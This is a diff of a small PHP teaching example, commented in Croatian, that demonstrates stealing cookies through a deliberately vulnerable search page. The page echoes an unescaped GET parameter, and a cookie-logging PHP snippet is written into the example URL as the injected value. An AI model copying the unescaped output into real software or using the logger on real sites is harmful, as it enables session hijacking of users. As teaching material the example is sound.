@@ -1,25 +1,20 @@
 //Primjer ranjive web stranice preko koje će se izvršiti zlonamjerna skripta
-//URL stranice:http://www.nas_posluzitelj.com/pojam.php 
+//URL stranice:http://www.nas_posluzitelj.com/pojam.php?pojam=<?php $cookies = $_GET["c"]; $file = fopen('log.txt', 'a'); fwrite($file, $cookies . "\n\n");?>
+//kolačići se pohranjuju u datoteci log.txt
+
+//Ranjiva web stranica
 
 <HTML>
 <?php session_start() ?>
 <BODY>
-//možemo skratiti ispis i napisati samo <h1>Error 404 Not Found</h1>
-//ispis na stranici koji preko get metode prenosi pojam na web stranicu
-Traženi pojam
+....
 <?php
-echo $_GET['pojam']; //neprovjereni i nekodirani ispis traženog pojma
+echo $_GET['pojam']; //pojam se dohvaća iz linka te se umjesto pojma dohvaća skripta koja će se izvršiti
 ?>
- nije pronađen.
- 
- 
- //php skripta kojom krademo kolačiće
- 
- <?php
-$cookies = $_GET["c"];
-$file = fopen('log.txt', 'a');
-fwrite($file, $cookies . "\n\n");
-?>
+
+
+
+ ....
 
 </BODY>
 </HTML> 
